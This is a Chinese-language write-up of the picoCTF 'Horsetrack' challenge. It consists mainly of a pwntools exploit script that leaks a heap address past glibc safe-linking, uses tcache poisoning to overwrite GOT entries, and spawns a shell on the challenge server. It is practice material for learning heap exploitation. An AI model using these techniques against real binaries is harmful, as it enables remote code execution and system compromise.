# Horsetrack

[题目](https://play.picoctf.org/practice/challenge/353)

这题拖了很久，有一些人发的wp只能在本地成功，而且很复杂我看不懂。今天偶然发现一篇[wp](https://blog.maple3142.net/2023/03/29/picoctf-2023-writeups/#horsetrack)，啊还能这么玩？源码我就不分析了（比赛的时候看得我都记下来了，几个月后再看没想到还没忘）。

```py
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
#context.log_level = "debug"


def cheat(idx: int, name: bytes, new_pos: int):
    io.sendlineafter(b"Choice: ", b"0")
    io.sendlineafter(b"? ", str(idx).encode())
    io.sendlineafter(b": ", name)
    io.sendlineafter(b"? ", str(new_pos).encode())


def add_horse(idx: int, name: bytes, namelen: int = None):
    if namelen is None:
        namelen = len(name)
    io.sendlineafter(b"Choice: ", b"1")
    io.sendlineafter(b"? ", str(idx).encode())
    io.sendlineafter(b"? ", str(namelen).encode())
    io.sendlineafter(b": ", name)


def remove_horse(idx: int):
    io.sendlineafter(b"Choice: ", b"2")
    io.sendlineafter(b"? ", str(idx).encode())


def race():
    io.sendlineafter(b"Choice: ", b"3")


def demangle(obfus_ptr):
    o2 = (obfus_ptr >> 12) ^ obfus_ptr
    return (o2 >> 24) ^ o2


elf = ELF("./vuln")
if args.REMOTE:
    io = remote("saturn.picoctf.net", 58286)
else:
    io = gdb.debug( #使用gdb.debug需要安装gdbserver：sudo apt-get install gdbserver
         "./vuln",
         "\n".join(
            [
                "b *0x00401550",
                "b *0x40165f"
            ]
         ),
    )
# need to have at least 5 horses to race
add_horse(15, b"X" * 0x18)
add_horse(16, b"Y" * 0x18)
add_horse(17, b"Z" * 0x18)
add_horse(0, b"A" * 0x10)
add_horse(1, b"B" * 0x10)
remove_horse(0) #进tcache。tcache和fastbin一个顺序，所以这里先放0号再放1号，接下来申请得到的顺序是1->0
remove_horse(1) #这里有safe linking：https://cloud.tencent.com/developer/article/1643954 。当0号堆块被放入tcache时，其前面没有堆块，于是fd应该为0。但是在safe linking的异或作用下，其fd保留着aslr的随机值。1号堆块的fd是0号堆块的地址。假设1号堆块的地址为A，0号堆块（未加密的fd）的地址为B。那么加密后的fd为 (A>>12)^B
# [1] -> [0]
add_horse(1, b"\xff", 16) #根据源码，add时输入\xff程序就会跳过输入，不会破坏堆块原本的结构。这里堆块里就是加密的fd了
add_horse(0, b"A" * 0x10) #这里应该是aslr随机值。像wp作者这样不要也可以，要也可以。如果要的话，下面mangle就直接用aslr随机值去异或了，参考https://github.com/AlexSutila/picoCTF-2023-writeups/blob/main/horsetrack/horsetrack.md
race() #race时会展示每匹马的名称，于是泄露地址
if args.REMOTE:
    # hack
    # when we send `3\n` to remote, remote will respond with `3\r\n`...
    assert io.recvline() == b"3\r\n"
io.recvline()  # name for 0
leak = io.recvline().strip(b" |\r\n")  # name for 1
print("LEAK", leak)
io.recvuntil(b"WINNER: ")
print("win", io.recvline())
print(leak)
ptr = demangle(int.from_bytes(leak, "little")) #demangle获取真正的fd值：ptr。今后ptr>>12就是aslr值了。根据我的实验，似乎任何堆块的地址>>12都是aslr值
print(f"{ptr = :#x}")  # points to name for 0


remove_horse(0) #接下来都是tcache poisoning了
remove_horse(1)
target = 0x4040E0  # target要与16对齐，好像是高版本才出现的限制
print(f"{target = :#x}")
cheat(1, p64(target ^ (ptr >> 12)).ljust(16, b"\x00"), 0) #和低版本tcache poisoning的区别在于多了个mangle步骤
add_horse(1, b"A" * 0x10)
add_horse(0, p64(target + 8) + b"sh".ljust(8, b"\x00"))  # write
# now stderr = "sh"

remove_horse(15)
remove_horse(16)
# [16] -> [15]
target = 0x404040 #setbuf的got表地址，和system以及printf的got表连着
print(f"{target = :#x}")
cheat(16, p64(target ^ (ptr >> 12)).ljust(16, b"\x00"), 0)
add_horse(16, b"A" * 0x18)
# got table layout: setbuf, system, printf
resolve_system = 0x401096 #一个函数的plt表是3条指令：jmp addr;push num;jmp addr（参考https://zhuanlan.zhihu.com/p/130271689）。这里我不太明白为什么将setbuf的got改到这里。猜测是因为system之前调用过了，就不同走第一个jmp去got表获取地址了。问题是，当我尝试把地址改到第一个jmp时，没有报错，interactive成功切出来了，但是输入命令没有回显
add_horse(15, p64(resolve_system) * 2 + p64(0x401B90)) #0x401b90是程序里调用 setbuf(stderr,(char *)0x0); 的地方
#所以getshell方法很简单：将setbuf的got表改为调用system，（因为和system的got连着，所以p64(resolve_system) * 2，正好system原本的got表也是返回这里的），然后将printf got改成调用 setbuf(stderr,(char *)0x0); 。因为stderr之前已经往里面写了sh，调用printf->setbuf(stderr,(char *)0x0);->system("sh")
io.interactive()
```